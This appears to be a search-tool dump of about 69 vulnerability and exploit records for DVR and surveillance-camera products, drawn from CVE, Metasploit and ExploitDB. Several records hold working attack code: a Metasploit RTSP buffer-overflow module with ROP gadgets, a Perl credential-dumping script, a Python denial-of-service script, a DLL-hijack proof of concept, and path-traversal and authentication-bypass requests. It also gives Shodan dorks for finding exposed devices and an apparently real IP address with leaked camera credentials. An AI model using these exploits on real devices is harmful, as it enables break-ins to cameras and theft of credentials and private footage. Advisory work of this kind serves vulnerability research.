检索到漏洞和exp的总条数:69
{'source': 'CVE', '_id': '2013-3586', 'description': 'Samsung Web Viewer for Samsung DVR devices allows remote attackers to bypass authentication via an arbitrary SessionID value in a cookie.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2013-3586'], 'msb': []}
{'code': '##\n# This module requires Metasploit: http//metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire \'msf/core\'\n\nclass Metasploit4 < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      \'Name\'           => \'Hikvision DVR RTSP Request Remote Code Execution\',\n      \'Description\'    => %q{\n        This module exploits a buffer overflow in the RTSP request parsing\n        code of Hikvision DVR appliances. The Hikvision DVR devices record\n        video feeds of surveillance cameras and offer remote administration\n        and playback of recorded footage.\n\n        The vulnerability is present in several models / firmware versions\n        but due to the available test device this module only supports\n        the DS-7204 model.\n      },\n      \'Author\'         =>\n        [\n          \'Mark Schloesser <mark_schloesser[at]rapid7.com>\', # @repmovsb, vulnerability analysis & exploit dev\n        ],\n      \'License\'        => MSF_LICENSE,\n      \'References\'     =>\n        [\n          [ \'CVE\', \'2014-4880\' ],\n          [ \'URL\', \'https://community.rapid7.com/community/metasploit/blog/2014/11/19/r7-2014-18-hikvision-dvr-devices--multiple-vulnerabilities\' ]\n        ],\n      \'Platform\'       => \'linux\',\n      \'Arch\'           => ARCH_ARMLE,\n      \'Privileged\'     => true,\n      \'Targets\'        =>\n        [\n          #\n          # ROP targets are difficult to represent in the hash, use callbacks instead\n          #\n          [ "DS-7204 Firmware V2.2.10 build 131009", {\n\n            # The callback handles all target-specific settings\n            :callback => :target_ds7204_1,\n              \'g_adjustesp\' => 0x002c828c,\n              # ADD             SP, SP, #0x350\n              # LDMFD           SP!, {R4-R6,PC}\n\n              \'g_r3fromsp\'  => 0x00446f80,\n              # ADD             R3, SP, #0x60+var_58\n              # BLX             R6\n\n              \'g_blxr3_pop\' => 0x00456360,\n              # BLX             R3\n              # LDMFD           SP!, {R1-R7,PC}\n\n              \'g_popr3\'     => 0x0000fe98,\n              # LDMFD           SP!, {R3,PC}\n          } ],\n\n          [ "Debug Target", {\n\n            # The callback handles all target-specific settings\n            :callback => :target_debug\n\n          } ]\n\n        ],\n      \'DefaultTarget\'  => 0,\n      \'DisclosureDate\' => \'Nov 19 2014\'))\n\n    register_options(\n      [\n        Opt::RPORT(554)\n      ], self.class)\n  end\n\n  def exploit\n    unless self.respond_to?(target[:callback])\n      fail_with(Failure::NoTarget, "Invalid target specified: no callback function defined")\n    end\n\n    device_rop = self.send(target[:callback])\n\n    request =  "PLAY rtsp://#{rhost}/ RTSP/1.0\\r\\n"\n    request << "CSeq: 7\\r\\n"\n    request << "Authorization: Basic "\n    request << rand_text_alpha(0x280 + 34)\n    request << [target["g_adjustesp"]].pack("V")[0..2]\n    request << "\\r\\n\\r\\n"\n    request << rand_text_alpha(19)\n\n    # now append the ropchain\n    request << device_rop\n    request << rand_text_alpha(8)\n    request << payload.encoded\n\n    connect\n    sock.put(request)\n    disconnect\n  end\n\n  # These devices are armle, run version 1.3.1 of libupnp, have random stacks, but no PIE on libc\n  def target_ds7204_1\n    # Create a fixed-size buffer for the rop chain\n    ropbuf = rand_text_alpha(24)\n\n    # CHAIN = [\n    #   0, #R4 pop adjustsp\n    #   0, #R5 pop adjustsp\n    #   GADGET_BLXR3_POP, #R6 pop adjustsp\n    #   GADGET_POPR3,\n    #   0, #R3 pop\n    #   GADGET_R3FROMSP,\n    # ]\n\n    ropbuf[8,4] = [target["g_blxr3_pop"]].pack("V")\n    ropbuf[12,4] = [target["g_popr3"]].pack("V")\n    ropbuf[20,4] = [target["g_r3fromsp"]].pack("V")\n\n    return ropbuf\n  end\n\n  # Generate a buffer that provides a starting point for exploit development\n  def target_debug\n    Rex::Text.pattern_create(2000)\n  end\n\n  def rhost\n    datastore[\'RHOST\']\n  end\n\n  def rport\n    datastore[\'RPORT\']\n  end\n\nend\n', 'description': 'This module exploits a buffer overflow in the RTSP request parsing\n        code of Hikvision DVR appliances. The Hikvision DVR devices record\n        video feeds of surveillance cameras and offer remote administration\n        and playback of recorded footage.\n\n        The vulnerability is present in several models / firmware versions\n        but due to the available test device this module only supports\n        the DS-7204 model.', 'bid': [], 'rank': 'normal', 'alias': None, 'arch': '["armle"]', '_id': 'exploit/linux/misc/hikvision_rtsp_bof', 'osvdb': [], 'author': ['Mark Schloesser <mark_schloesser@rapid7.com>'], 'msb': [], 'platform': ['Linux'], 'version': '0', 'source': 'Metasploit', 'title': 'Hikvision DVR RTSP Request Remote Code Execution', 'cve': ['CVE-2014-4880'], 'type': 'exploit', 'privileged': True}
{'code': '# Exploit Title: HBGK DVR V3.0.0 build20161206  - Authentication Bypass\r\n# Date: 24-09-2017\r\n# Vendor Homepage: http://www.hbgk.net/en/\r\n# Exploit Author: RAT - ThiefKing\r\n# Contact: https://www.facebook.com/cctvsuperpassword\r\n# Website: http://tromcap.com\r\n# Category: webapps\r\n# Tested on: V2.3.1 build20160927, V3.0.0 build20161206\r\n# Shodan Dork: NVR Webserver\r\n\r\n1. Description\r\n- Any registered user can login when edit cookie userInfo\r\n\r\n2. Proof of Concept\r\n- When login successful: DVR save cookie : userInfo + webport with \r\nvalue: base64 encode (user:pass)\r\nEx: http://dvr-domain.dynns.com:85 --> When login successful (user: \r\nadmin, pass: admin), DVR will save cookie: userInfo85 with value \r\nYWRtaW46YWRtaW4= (admin:admin <-- base64 decode)\r\nBut Dvr not check pass with cookie. When not yet login, you add a \r\ncookie: userInfoXX (xx : web port) with value base64 encode (admin: any \r\nwords). And go url: http://dvr-domain.dynns.com:XX/doc/page/main.asp. It \r\nwill Authentication Bypass\r\n\r\n3. Solution:\r\nUpdate to Firmware version V3.0.0 build20170925', 'description': 'HBGK DVR 3.0.0 build20161206 - Authentication Bypass', 'author': 'RAT - ThiefKing', '_id': 42931, 'source': 'ExploitDB', 'platform': 'hardware', 'date': '2017-09-24T00:00:00+00:00', 'cve': [], 'type': 'webapps', 'port': 0}
{'source': 'CVE', '_id': '2011-3828', 'description': 'DVRemoteAx.ax 2.1.0.39 in the DVR Remote ActiveX control allows remote attackers to execute arbitrary code via a crafted DVRobot.dll file in a manifest directory on a web server.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2011-3828'], 'msb': []}
{'source': 'CVE', '_id': '2013-3613', 'description': 'Dahua DVR appliances do not properly restrict UPnP requests, which makes it easier for remote attackers to obtain access via vectors involving a replay attack against the TELNET port.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2013-3613'], 'msb': []}
{'code': 'source: http://www.securityfocus.com/bid/47509/info\r\n\r\nViola DVR is prone to multiple directory-traversal vulnerabilities because it fails to sufficiently sanitize user-supplied input.\r\n\r\nExploiting the issues can allow an attacker to obtain sensitive information that could aid in further attacks.\r\n\r\nViola DVR VIO-4/1000 is vulnerable; other products may also be affected. \r\n\r\nhttp://www.example.com/cgi-bin/wappwd?FILEFAIL=../../../etc/passwd\r\nhttp://www.example.com/cgi-bin/wapopen?FILECAMERA=../../../etc/passwd', 'description': 'Viola DVR VIO-4/1000 - Multiple Directory Traversal Vulnerabilities', 'author': 'QSecure', '_id': 35644, 'source': 'ExploitDB', 'platform': 'linux', 'date': '2011-04-19T00:00:00+00:00', 'cve': [], 'type': 'remote', 'port': 0}
{'source': 'CVE', '_id': '2013-3614', 'description': 'Dahua DVR appliances have a small value for the maximum password length, which makes it easier for remote attackers to obtain access via a brute-force attack.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2013-3614'], 'msb': []}
{'source': 'CVE', '_id': '2018-15745', 'description': 'Argus Surveillance DVR 4.0.0.0 devices allow Unauthenticated Directory Traversal, leading to File Disclosure via a ..%2F in the WEBACCOUNT.CGI RESULTPAGE parameter.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2018-15745'], 'msb': []}
{'source': 'CVE', '_id': '2008-4380', 'description': 'The web interface in Samsung DVR SHR2040 allows remote attackers to cause a denial of service (crash) via a malformed HTTP request, related to the filter for configuration properties and "/x" characters.', 'osvdb': [], 'bid': [31047], 'cve': ['CVE-2008-4380'], 'msb': []}
{'source': 'CVE', '_id': '2009-2305', 'description': 'The ARD-9808 DVR card security camera allows remote attackers to cause a denial of service via a long URI composed of //.\\ (slash slash dot backslash) sequences.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2009-2305'], 'msb': []}
{'source': 'CVE', '_id': '2013-3615', 'description': 'Dahua DVR appliances use a password-hash algorithm with a short hash length, which makes it easier for context-dependent attackers to discover cleartext passwords via a brute-force attack.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2013-3615'], 'msb': []}
{'source': 'CVE', '_id': '2009-3828', 'description': 'The web interface for Everfocus EDR1600 DVR allows remote attackers to bypass authentication and access live cams via certain vectors.', 'osvdb': [59139], 'bid': [], 'cve': ['CVE-2009-3828'], 'msb': []}
{'source': 'CVE', '_id': '2018-10734', 'description': 'KONGTOP DVR devices A303, A403, D303, D305, and D403 contain a backdoor that prints the login password via a Print_Password function call in certain circumstances.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2018-10734'], 'msb': []}
{'source': 'CVE', '_id': '2011-3401', 'description': 'ENCDEC.DLL in Windows Media Player and Media Center in Microsoft Windows XP SP2 and SP3, Windows Vista SP2, and Windows 7 Gold and SP1 allows remote attackers to execute arbitrary code via a crafted .dvr-ms file, aka "Windows Media Player DVR-MS Memory Corruption Vulnerability."', 'osvdb': [], 'bid': [], 'cve': ['CVE-2011-3401'], 'msb': ['MS11-092']}
{'code': '# Exploit Title: Argus Surveillance DVR 4.0.0.0 - Privilege Escalation\r\n# Author: John Page (aka hyp3rlinx)\r\n# Date: 2018-08-29\r\n# Vendor: Argus Surveillance DVR - 4.0.0.0\r\n# Software Link: http://www.argussurveillance.com/download/DVR_stp.exe\r\n# CVE: N/A\r\n# Tested on: Windows 7 x86\r\n\r\n# Description:\r\n# Argus Surveillance DVR 4.0.0.0 devices allow Trojan File SYSTEM Privilege Escalation.\r\n# Placing a Trojan File DLL named "gsm_codec.dll" in Argus application directory will \r\n# lead to arbitrary code execution with SYSTEM integrity\r\n# Affected Component: DVRWatchdog.exe\r\n\r\n# Exploit/POC\r\n# Create DLL 32bit DLL named "gsm_codec.dll" and place in App Dir, \r\n# launch Argus DVR tada! your now SYSTEM.\r\n\r\n#include <windows.h>\r\n\r\n/* hyp3rlinx */\r\n\r\n/*\r\ngcc -c -m32 gsm_codec.c\r\ngcc -shared -m32 -o gsm_codec.dll gsm_codec.o\r\n*/\r\n\r\nvoid systemo(){\r\n\t MessageBox( 0, "3c184981367094fce3ab70efc3b44583" , "philbin :)" , MB_YESNO + MB_ICONQUESTION );\r\n}\r\n\r\nBOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved){\r\n\tswitch(fdwReason){\r\n\t\tcase DLL_PROCESS_ATTACH:{\r\n\t\t\t systemo();\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tcase DLL_PROCESS_DETACH:{\r\n\t\t\t systemo();\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tcase DLL_THREAD_ATTACH:{\r\n\t\t\t systemo();\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\tcase DLL_THREAD_DETACH:{\r\n\t\t\t systemo();\r\n\t\t\tbreak;\r\n\t\t}\r\n\t}\r\n\t\r\n\treturn TRUE;\r\n}\r\n\r\n# https://vimeo.com/287115698\r\n# Greetz: ***Greetz: indoushka | Eduardo | GGA***', 'description': 'Argus Surveillance DVR 4.0.0.0 - Privilege Escalation', 'author': 'hyp3rlinx', '_id': 45312, 'source': 'ExploitDB', 'platform': 'windows_x86', 'date': '2018-08-31T00:00:00+00:00', 'cve': [], 'type': 'local', 'port': 0}
{'source': 'CVE', '_id': '2007-0877', 'description': 'Unspecified vulnerability in March Networks DVR 3000 and 4000 Digital Video Recorders allows attackers to cause an unspecified denial of service.  NOTE: the provenance of this information is unknown; the details are obtained solely from third party information.', 'osvdb': [38098], 'bid': [22497], 'cve': ['CVE-2007-0877'], 'msb': []}
{'source': 'CVE', '_id': '2013-6023', 'description': 'Directory traversal vulnerability in the TVT TD-2308SS-B DVR with firmware 3.2.0.P-3520A-00 and earlier allows remote attackers to read arbitrary files via .. (dot dot) in the URI.', 'osvdb': [], 'bid': [63360], 'cve': ['CVE-2013-6023'], 'msb': []}
{'source': 'CVE', '_id': '2013-6117', 'description': 'Dahua DVR 2.608.0000.0 and 2.608.GV00.0 allows remote attackers to bypass authentication and obtain sensitive information including user credentials, change user passwords, clear log files, and perform other actions via a request to TCP port 37777.', 'osvdb': [99783], 'bid': [], 'cve': ['CVE-2013-6117'], 'msb': []}
{'source': 'CVE', '_id': '2014-4880', 'description': 'Buffer overflow in Hikvision DVR DS-7204 Firmware 2.2.10 build 131009, and other models and versions, allows remote attackers to execute arbitrary code via an RTSP PLAY request with a long Authorization header.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2014-4880'], 'msb': []}
{'source': 'CVE', '_id': '2009-1092', 'description': 'Use-after-free vulnerability in the LIVEAUDIO.LiveAudioCtrl.1 ActiveX control in LIVEAU~1.OCX 7.0 for GeoVision DVR systems allows remote attackers to execute arbitrary code by calling the GetAudioPlayingTime method with certain arguments.', 'osvdb': [], 'bid': [34115], 'cve': ['CVE-2009-1092'], 'msb': []}
{'source': 'CVE', '_id': '2013-4981', 'description': 'Buffer overflow in cgi-bin/user/Config.cgi in AVTECH AVN801 DVR with firmware 1017-1003-1009-1003 and earlier, and possibly other devices, allows remote attackers to cause a denial of service (device crash) and possibly execute arbitrary code via a long string in the Network.SMTP.Receivers parameter.', 'osvdb': [96693], 'bid': [], 'cve': ['CVE-2013-4981'], 'msb': []}
{'source': 'CVE', '_id': '2007-6638', 'description': 'March Networks DVR 3204 stores sensitive information under the web root with insufficient access control, which allows remote attackers to obtain usernames, passwords, device names, and IP addresses via a direct request for scripts/logfiles.tar.gz.', 'osvdb': [39726], 'bid': [27054], 'cve': ['CVE-2007-6638'], 'msb': []}
{'source': 'CVE', '_id': '2009-2306', 'description': 'The ARD-9808 DVR card security camera stores sensitive information under the web root with insufficient access control, which allows remote attackers to download a file containing usernames and passwords via a direct request for dvr.ini.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2009-2306'], 'msb': []}
{'source': 'CVE', '_id': '2018-10676', 'description': 'CeNova, Night OWL, Novo, Pulnix, QSee, Securus, and TBK Vision DVR devices allow remote attackers to download a file and obtain sensitive credential information via a direct request for the download.rsp URI.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2018-10676'], 'msb': []}
{'code': "----------------------------------------------------------------------\r\nTitle\t\t: LG DVR LE6016D - Remote File Disclosure Vulnerability (0day)\r\nCVE-ID\t\t: none\r\nProduct\t\t: LG\r\nAffected \t: All versions\r\nImpact\t\t: Critical\r\nRemote\t\t: Yes\r\nProduct link: http://www.lgecommercial.com/security-en/products/analog-product/analog-dvr/lg-LE6016D\r\nReported\t: 10/02/2015\r\nAuthor\t\t: Yakir Wizman, yakir.wizman@gmail.com\r\n\r\n\r\nVulnerability description:\r\n----------------------------------------------------------------------\r\nNo authentication (login) is required to exploit this vulnerability. \r\nThe LG DVR application is prone to a remote file disclosure vulnerability.\r\nAn attacker can exploit this vulnerability to retrieve stored files on server such as '/etc/passwd' and '/etc/shadow' by using a simple url request which made by browser.\r\nMore over, an attacker may be able to compromise encrypted login credentials for or retrieve the device's administrator password allowing them to directly access the device's configuration control panel.\r\n\r\n\r\nProof of concept:\r\n----------------------------------------------------------------------\r\nThe following simple url request will retrieve '/etc/shadow' file:\r\nhttp://127.0.0.1:1234/etc/shadow\r\n\r\n\r\n~eof.", 'description': 'LG DVR LE6016D - Remote File Disclosure', 'author': 'Yakir Wizman', '_id': 36042, 'source': 'ExploitDB', 'platform': 'hardware', 'date': '2015-02-10T00:00:00+00:00', 'cve': [], 'type': 'webapps', 'port': 0}
{'source': 'CVE', '_id': '2013-3585', 'description': 'Samsung Web Viewer for Samsung DVR devices stores credentials in cleartext, which allows context-dependent attackers to obtain sensitive information via vectors involving (1) direct access to a file or (2) the user-setup web page.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2013-3585'], 'msb': []}
{'source': 'CVE', '_id': '2013-3612', 'description': 'Dahua DVR appliances have a hardcoded password for (1) the root account and (2) an unspecified "backdoor" account, which makes it easier for remote attackers to obtain administrative access via authorization requests involving (a) ActiveX, (b) a standalone client, or (c) unknown other vectors.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2013-3612'], 'msb': []}
{'source': 'CVE', '_id': '2014-8006', 'description': 'The Disaster Recovery (DRA) feature on the Cisco ISB8320-E High-Definition IP-Only DVR allows remote attackers to bypass authentication by establishing a TELNET session during a recovery boot, aka Bug ID CSCup85422.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2014-8006'], 'msb': []}
{'source': 'CVE', '_id': '2011-0042', 'description': 'SBE.dll in the Stream Buffer Engine in Windows Media Player and Windows Media Center in Microsoft Windows XP SP2 and SP3, Windows XP Media Center Edition 2005 SP3, Windows Vista SP1 and SP2, Windows 7 Gold and SP1, and Windows Media Center TV Pack for Windows Vista does not properly parse Digital Video Recording (.dvr-ms) files, which allows remote attackers to execute arbitrary code via a crafted file, aka "DVR-MS Vulnerability."', 'osvdb': [71016], 'bid': [46680], 'cve': ['CVE-2011-0042'], 'msb': ['MS11-015']}
{'code': 'import socket\r\nimport sys\r\nprint "----------------------------------------------------------------"\r\nprint " ARD-9808 DVR Card Security Camera <= Remote Denial Of Service  "\r\nprint " author: Stack                                                  "\r\nprint "----------------------------------------------------------------"\r\nhost = "127.0.0.1"\r\nport = 80\r\ntry:\r\n       buff = "//.\\\\" * 1000\r\n       request =  "GET " + buff + " HTTP/1.0"\r\n       connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n       connection.connect((host, port))\r\n       connection.send(request)\r\n       raw_input(\'\\n\\nExploit completed. Press "Enter" to quit...\')\r\n       sys.exit\r\nexcept:\r\n       raw_input(\'\\n\\nUnable to connect. Press "Enter" to quit...\')\r\n\r\n# milw0rm.com [2009-07-01]', 'description': 'ARD-9808 DVR Card Security Camera - GET Remote Denial of Service', 'author': 'Stack', '_id': 9067, 'source': 'ExploitDB', 'platform': 'hardware', 'date': '2009-07-01T00:00:00+00:00', 'cve': [], 'type': 'dos', 'port': 0}
{'code': '#!/usr/bin/perl\r\n#\r\n#              LG DVR LE6016D unauthenticated remote \r\n#               users/passwords disclosure exploit\r\n#\r\n#\r\n#                Copyright 2015 (c) Todor Donev\r\n#                  <todor.donev at gmail.com>\r\n#                http://www.ethical-hacker.org/\r\n#### \r\n#\r\n#  Digital video recorder (DVR) surveillance is the use of cameras, \r\n#  often hidden or concealed, that use DVR technology to record \r\n#  video for playback or immediate viewing. As technological \r\n#  innovations have made improvements in the security and \r\n#  surveillance industry, DVR surveillance has become more \r\n#  prominent and allows for easier and more versatile security \r\n#  systems in homes and businesses. A DVR surveillance security \r\n#  system can be designed for indoor use or outdoor use and can \r\n#  often involve hidden security cameras, concealed “nanny cams” \r\n#  for home security, and even personal recording devices hidden \r\n#  on a person.\r\n#\r\n####\r\n#\r\n#  Description:\r\n#  No authentication (login) is required to exploit this vulnerability. \r\n#  This program demonstrates how unpatched security bug would enable \r\n#  hackers to gain control of a vulnerable device while sitting \r\n#  behind their keyboard, potentially thousands of miles away.\r\n#  An unauthenticated attacker that is connected to the DVR\'s may be \r\n#  able to retrieve the device\'s administrator password allowing them \r\n#  to directly access the device\'s configuration control panel.\r\n#\r\n####\r\n#\r\n#  Disclaimer:\r\n#  This or previous programs is for Educational purpose ONLY. Do not \r\n#  use it without permission.The usual disclaimer applies, especially \r\n#  the fact that Todor Donev is not liable for any damages caused by \r\n#  direct or indirect use of the information or functionality provided \r\n#  by these programs. The author or any Internet provider bears NO \r\n#  responsibility for content or misuse of these programs or any \r\n#  derivatives thereof. By using these programs you accept the fact\r\n#  that any damage (dataloss, system crash, system compromise, etc.) \r\n#  caused by the use of these programs is not Todor Donev\'s \r\n#  responsibility.\r\n#\r\n####\r\n#                Use them at your own risk!\r\n#### \r\n#\r\n#         $ perl lg.pl 133.7.133.7:80\r\n#            LG DVR LE6016D unauthenticated remote\r\n#              users/passwords disclosure exploit\r\n#                    u/p: admin/000000\r\n#                    u/p: user1/000000\r\n#                    u/p: user2/000000\r\n#                    u/p: user3/000000\r\n#                    u/p: LOGOUT/000000\r\n#               Copyright 2015 (c) Todor Donev\r\n#                 <todor.donev at gmail.com>\r\n#               http://www.ethical-hacker.org/\r\n#\r\n####\r\n \r\nuse LWP::Simple;\r\nprint "   LG DVR LE6016D unauthenticated remote\\n     users/passwords disclosure exploit\\n";\r\nif (@ARGV == 0) {&usg; &foot;}\r\nwhile (@ARGV > 0) {\r\n$t = shift(@ARGV);\r\n}\r\nmy $r = get("http://$t/dvr/wwwroot/user.cgi") or die("Error $!");\r\nfor (my $i=0; $i <= 4; $i++){\r\nif  ($r =~ m/<name>(.*)<\\/name>/g){\r\nprint "           u\\/p: $1\\/";\r\n}\r\nif  ($r =~ m/<pw>(.*)<\\/pw>/g){\r\nprint "$1\\n";\r\n}\r\n}\r\n&foot;\r\nsub usg(){\r\nprint "\\n Usage: perl $0 <target:port>\\n Example: perl $0 133.7.133.7:80\\n\\n";\r\n}\r\nsub foot(){\r\nprint "      Copyright 2015 (c) Todor Donev\\n        <todor.donev at gmail.com>\\n";\r\nprint "      http://www.ethical-hacker.org/\\n";\r\nexit;\r\n}', 'description': 'LG DVR LE6016D - Remote Users/Passwords Disclosure', 'author': 'Todor Donev', '_id': 36014, 'source': 'ExploitDB', 'platform': 'hardware', 'date': '2015-02-07T00:00:00+00:00', 'cve': [], 'type': 'remote', 'port': 0}
{'code': '1. Advisory Information\r\n========================================\r\nTitle                   : C2S DVR Management Remote Credentials Disclosure & Authentication Bypass\r\nVendor Homepage         : http://www.cash2s.com/en/\r\nRemotely Exploitable\t: Yes\r\nTested on Camera types\t: IRDOME-II-C2S, IRBOX-II-C2S, DVR\r\nVulnerabilities         : Credentials Disclosure\r\n+                       : Authentication bypass\r\nDate                    : 19/08/2016\r\nShodan Dork             : html:write.cgi "Content-length: 2676"\r\nAuthor                  : Yakir Wizman (https://www.linkedin.com/in/yakirwizman)\r\n \r\n \r\n2. CREDIT\r\n========================================\r\nThis vulnerability was identified during penetration test by Yakir Wizman.\r\n  \r\n\r\n3. Description\r\n========================================\r\nC2S DVR allows to unauthenticated user disclose the username & password remotely by simple request to the server page \'read.cgi?page=2\' which can be made by browser or burp/fiddler.\r\nMoreover, an attacker could easily access to password change page without any authentication, thats happen cuase the web application does not perform any session management.\r\n\r\n\r\n4. Proof-of-Concept:\r\n========================================\r\nRemote Credentials Disclosure:\r\n-----------------------------------------------\r\nSimply go to the following url to read the credentials:\r\nhttp://host:port/cgi-bin/read.cgi?page=2\r\n\r\nShould return some javascript variable which contain the credentials and other configuration vars:\r\n\r\nvar pw_enflag = "1";\r\nvar pw_adminpw = "12345";\r\nvar pw_retype1 = "12345";\r\nvar pw_userpw = "56789";\r\nvar pw_retype2 = "56789";\r\nvar pw_autolock = "0";\r\n\r\n\r\nLogin @ http://host:port/\r\n-----------------------------------------------\r\n\r\n\r\nAuthentication Bypass:\r\n-----------------------------------------------\r\nThe application does not require a valid session for any page on the server, for example you can access to \'password.htm\' which allows you to change/disclose the admin password with just a few clicks.\r\n\r\nhttp://host:port/password.htm?parm1=&parm2=1\r\n\r\n\r\n\r\n5. SOLUTION\r\n========================================\r\nContact the vendor for further information regarding the proper mitigation of this vulnerability.', 'description': 'C2S DVR Management IRDOME-II-C2S / IRBOX-II-C2S / DVR - Credentials Disclosure / Authentication Bypass', 'author': 'Yakir Wizman', '_id': 40265, 'source': 'ExploitDB', 'platform': 'cgi', 'date': '2016-08-19T00:00:00+00:00', 'cve': [], 'type': 'webapps', 'port': 80}
{'code': '-------------------------------------------------\r\nSoftWare Name : ARD-9808 DVR Card Security Camera Passwords View Bug\r\n-------------------------------------------------\r\nAuthor : Septemb0x\r\nWeb Site : www.ozkanbozkurt.com\r\nProcuts Site : http://www.armassa.com.tr/shop/category.php?sid=C2B7D6B59AF75CF88011987A080A46FD&id=87789673\r\nSoftware Download : http://www.armassa.com.tr/shop/down/ard9808.rar = Open To Rar > DVR > Dvr.ini\r\nD0rk : "To enable control work: Tools->Internet Options->Security->Custom Level   Reset to: Low Or Download"\r\n-------------------------------------------------\r\nExploit: http://[sitename-ipadress]/dvr.ini\r\n-------------------------------------------------\r\nExample: http://88.249.248.177/dvr.ini\r\nShow;\r\n[PASSWORD]\r\nadministrator=\r\npassword_a=\r\nuser=\r\npassword=\r\nenable=0\r\nuser0=ozcan = Camera Username\r\npassword0=3893 = Camera Password\r\nright0=223\r\nencode=1\r\nnum=2\r\nuser1=yurt\r\npassword1=yurt\r\nright1=223\r\n.\r\n.\r\n.\r\n... Login The Camera :)\r\n-------------------------------------------------\r\nGreetz : BHDR, BARCOD3\r\n-------------------------------------------------\r\n\r\n# milw0rm.com [2009-07-01]', 'description': 'ARD-9808 DVR Card Security Camera - Arbitrary Configuration Disclosure', 'author': 'Septemb0x', '_id': 9066, 'source': 'ExploitDB', 'platform': 'hardware', 'date': '2009-07-01T00:00:00+00:00', 'cve': [], 'type': 'remote', 'port': 0}
{'code': '# Exploit: Argus Surveillance DVR 4.0.0.0 - Directory Traversal\r\n# Author: John Page (aka hyp3rlinx)\r\n# Date: 2018-08-28\r\n# Vendor: www.argussurveillance.com\r\n# Software Link: http://www.argussurveillance.com/download/DVR_stp.exe\r\n# CVE: N/A\r\n\r\n# Description:\r\n# Argus Surveillance DVR 4.0.0.0 devices allow Unauthenticated Directory Traversal, \r\n# leading to File Disclosure via a ..%2F in the WEBACCOUNT.CGI RESULTPAGE parameter.\r\n\r\n# PoC\r\n\r\ncurl "http://VICTIM-IP:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="\r\n\r\n# Result:\r\n\r\n; for 16-bit app support\r\nwoafont=dosapp.fon\r\nEGA80WOA.FON=EGA80WOA.FON\r\nEGA40WOA.FON=EGA40WOA.FON\r\nCGA80WOA.FON=CGA80WOA.FON\r\nCGA40WOA.FON=CGA40WOA.FON\r\n \r\nwave=mmdrv.dll\r\ntimer=timer.drv\r\n\r\n# https://vimeo.com/287115273\r\n# Greetz: ***Greetz: indoushka | Eduardo | GGA***', 'description': 'Argus Surveillance DVR 4.0.0.0 - Directory Traversal', 'author': 'hyp3rlinx', '_id': 45296, 'source': 'ExploitDB', 'platform': 'windows_x86', 'date': '2018-08-29T00:00:00+00:00', 'cve': [], 'type': 'webapps', 'port': 8080}
{'code': "**************************************************************\r\nProduct: Everfocus EDSR series\r\nVersion affected: 1.4 and older\r\nWebsite: http://www.everfocus.com/\r\nDiscovered By: Andrea Fabrizi\r\nEmail: andrea.fabrizi () gmail com\r\nWeb: http://www.andreafabrizi.it\r\nVuln: remote DVR applet authentication bypass\r\n**************************************************************\r\n\r\nThe EDSR firmware don't handle correctly users authentication and sessions.\r\n\r\nThis exploit let you to connect to every remote DVR (without username\r\nand password) and see the live cams :)\r\nExploit: http://www.andreafabrizi.it/files/EverFocus_Edsr_Exploit.tar.gz\r\n\r\nI discovered this vulnerability one year ago and i have informed the\r\nvendor, but apparently\r\nthere is no solution at this time.\r\n\r\n-- \r\nAndrea Fabrizi\r\nhttp://www.andreafabrizi.it\r\n\r\n\r\nhttps://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/10209.tar.gz (2009-11-22-EverFocus_Edsr_Exploit.tar.gz)", 'description': 'Everfocus 1.4 - EDSR Remote Authentication Bypass', 'author': 'Andrea Fabrizi', '_id': 10209, 'source': 'ExploitDB', 'platform': 'multiple', 'date': '2009-10-14T00:00:00+00:00', 'cve': [], 'type': 'webapps', 'port': 0}
{'code': '# Exploit Title: Security IP Camera Star Vision DVR Authentication Bypass\r\n# Date: 2015-08-13\r\n# Exploit Author: Meisam Monsef meisamrce@yahoo.com or meisamrce@gmail.com\r\n# Vendor Homepage: #\r\n# Version: All Versions\r\n\r\nExploit :\r\n1 - First, open your Chrome browser\r\n2 - Enter the IP address or domain to see the login screen of the camera\r\n3 - Press the F12 key to open the browser console\r\n4 - Click the Console tab and enter the following code\r\nlogin_set(1,1,1,1);\r\n5 - Now go to page view2.html\r\n6 - enjoy seeing camera :)\r\n\r\nTest : http://m.2.is/\r\n\r\nVideo Tutorial : http://s3.picofile.com/file/8206365584/cam.mp4.html', 'description': 'Security IP Camera Star Vision DVR - Authentication Bypass', 'author': 'Meisam Monsef', '_id': 37778, 'source': 'ExploitDB', 'platform': 'hardware', 'date': '2015-08-15T00:00:00+00:00', 'cve': [], 'type': 'webapps', 'port': 0}
{'source': 'CVE', '_id': '2018-11689', 'description': "Smart Viewer in Samsung Web Viewer for Samsung DVR is vulnerable to cross-site scripting, caused by improper validation of user-supplied input. A remote attacker could exploit this vulnerability via a crafted URL to execute script in a victim's Web browser within the security context of the hosting Web site, once the URL is clicked. An attacker could use this vulnerability to steal the victim's cookie-based authentication credentials.", 'osvdb': [], 'bid': [], 'cve': ['CVE-2018-11689'], 'msb': []}
